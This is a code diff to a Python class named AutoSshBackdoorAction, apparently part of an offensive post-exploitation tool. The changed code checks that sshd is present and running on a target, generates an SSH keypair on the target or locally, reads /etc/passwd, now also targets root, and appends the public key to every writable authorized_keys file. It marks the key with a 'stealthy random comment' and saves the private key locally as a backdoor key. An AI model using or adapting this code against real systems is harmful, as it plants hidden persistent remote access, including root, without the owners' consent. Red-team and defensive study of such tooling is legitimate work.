@@ -1,3 +1,8 @@
+import subprocess
+import tempfile
+import os
+from pathlib import Path
+
 from toboggan.core.action import BaseAction
 from toboggan.core.utils import generate_fixed_length_token
 
@@ -8,19 +13,93 @@ class AutoSshBackdoorAction(BaseAction):
     )
 
     def run(self) -> str:
+
+        sshd_path = self._executor.remote_execute("command -v sshd")
+        if not sshd_path or "not found" in sshd_path.lower():
+            self._logger.warning(
+                "⚠️ sshd is not installed on the target. SSH backdoor is currently unusable."
+            )
+            return "⚠️ sshd is not installed on the target."
+        else:
+            self._logger.info(f"🧭 sshd binary found at: {sshd_path.strip()}")
+            # Check if sshd is running
+            check_sshd = self._executor.remote_execute("ps aux | grep '[s]shd'")
+            if not check_sshd or "sshd" not in check_sshd:
+                self._logger.warning(
+                    "⚠️ sshd is not running on the target. You may need to start it manually."
+                )
+                return "⚠️ sshd is not running on the target."
+            else:
+                self._logger.success("✅ sshd is running.")
+
         # Step 1: Locate ssh-keygen
         sshkeygen_path = self._executor.remote_execute("command -v ssh-keygen")
         if not sshkeygen_path or "not found" in sshkeygen_path.lower():
-            return "❌ ssh-keygen not available on target."
-        sshkeygen_path = sshkeygen_path.strip()
-        self._logger.info(f"🔑 ssh-keygen found at: {sshkeygen_path}")
+            self._logger.warning(
+                "❌ ssh-keygen not available on target. Trying locally..."
+            )
+
+            if os.name != "posix":
+                return "❌ ssh-keygen not available remotely, and local OS is not Unix."
+
+            # Use tempfile for key generation
+            with tempfile.TemporaryDirectory() as tmpdir:
+                tmpdir_path = Path(tmpdir)
+                key_path = tmpdir_path / "id_ed25519"
+                comment = generate_fixed_length_token(12)
+
+                # Generate key locally
+                try:
+                    subprocess.run(
+                        [
+                            "ssh-keygen",
+                            "-t",
+                            "ed25519",
+                            "-f",
+                            str(key_path),
+                            "-N",
+                            "",
+                            "-C",
+                            comment,
+                            "-q",
+                        ],
+                        check=True,
+                    )
+                except Exception as e:
+                    return f"❌ Failed to generate key locally: {e}"
+
+                private_key = key_path.read_text()
+                public_key = (key_path.with_suffix(".pub")).read_text()
+                self._logger.info("🔑 SSH keypair generated locally.")
+        else:
+            self._logger.info(f"🔑 ssh-keygen found at: {sshkeygen_path}")
+            # Step 3: Generate random key filename and comment
+            token = generate_fixed_length_token(6)
+            key_path = f"/tmp/id_ed25519_{token}"
+            comment = generate_fixed_length_token(12)  # stealthy random comment
+
+            # Step 4: Generate SSH keypair
+            gen_cmd = (
+                f"{sshkeygen_path} -t ed25519 -f {key_path} -N '' -C '{comment}' -q"
+            )
+            self._executor.remote_execute(gen_cmd)
+
+            self._logger.info(f"🔑 SSH keypair generated at: {key_path}")
+
+            # Step 5: Read keys
+            private_key = self._executor.remote_execute(f"cat {key_path}")
+            public_key = self._executor.remote_execute(f"cat {key_path}.pub")
+            if not private_key or not public_key:
+                return "❌ Failed to read generated key pair."
+
+            self._logger.info("🔑 SSH keypair read successfully.")
 
         # Step 2: Identify candidate users
         passwd_data = self._executor.remote_execute("cat /etc/passwd")
         if not passwd_data:
             return "❌ Could not read /etc/passwd."
 
-        self._logger.info("🔍 Searching for writable user home directories...")
+        self._logger.info("🔍 Searching for writable home directories...")
 
         candidate_users = []
         for line in passwd_data.strip().splitlines():
@@ -29,8 +108,9 @@ class AutoSshBackdoorAction(BaseAction):
                 continue
             username, _, uid, _, _, home, _ = parts
             try:
-                if int(uid) < 1000 or username in ["nobody", "sync"]:
-                    continue
+                if username != "root":
+                    if int(uid) < 1000 or username in ["nobody", "sync"]:
+                        continue
             except ValueError:
                 continue
 
@@ -41,30 +121,9 @@ class AutoSshBackdoorAction(BaseAction):
                 candidate_users.append((username, home))
 
         if not candidate_users:
-            return "⚠️ No writable user home directories found."
+            return "⚠️ No writable home directories found."
 
-        self._logger.info(
-            f"👤 Found {len(candidate_users)} writable user home directories."
-        )
-
-        # Step 3: Generate random key filename and comment
-        token = generate_fixed_length_token(6)
-        key_path = f"/tmp/id_ed25519_{token}"
-        comment = generate_fixed_length_token(12)  # stealthy random comment
-
-        # Step 4: Generate SSH keypair
-        gen_cmd = f"{sshkeygen_path} -t ed25519 -f {key_path} -N '' -C '{comment}' -q"
-        self._executor.remote_execute(gen_cmd)
-
-        self._logger.info(f"🔑 SSH keypair generated at: {key_path}")
-
-        # Step 5: Read keys
-        private_key = self._executor.remote_execute(f"cat {key_path}")
-        public_key = self._executor.remote_execute(f"cat {key_path}.pub")
-        if not private_key or not public_key:
-            return "❌ Failed to read generated key pair."
-
-        self._logger.info("🔑 SSH keypair read successfully.")
+        self._logger.info(f"👤 Found {len(candidate_users)} writable home directories.")
 
         # Step 6: Inject pubkey to each valid user's authorized_keys
         injected = []
@@ -77,12 +136,21 @@ class AutoSshBackdoorAction(BaseAction):
                 f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir} && "
                 f"echo '{pubkey_escaped}' >> {auth_keys} && chmod 600 {auth_keys}"
             )
-            result = self._executor.remote_execute(install_cmd)
-            if result is None:
-                injected.append((username, auth_keys))
+            self._executor.remote_execute(install_cmd)
+
+            injected.append((username, auth_keys))
 
         # Step 7: Clean up temporary keypair
         self._executor.remote_execute(f"rm -f {key_path} {key_path}.pub")
+
+        # Save private key locally
+        local_save_path = Path.cwd() / "id_ed25519_backdoor"
+        try:
+            local_save_path.write_text(private_key)
+            local_save_path.chmod(0o600)
+            self._logger.success(f"💾 Private key saved locally: {local_save_path}")
+        except Exception as e:
+            return f"❌ Failed to save private key locally: {e}"
 
         if not injected:
             return "⚠️ No key could be injected despite writable home directories."
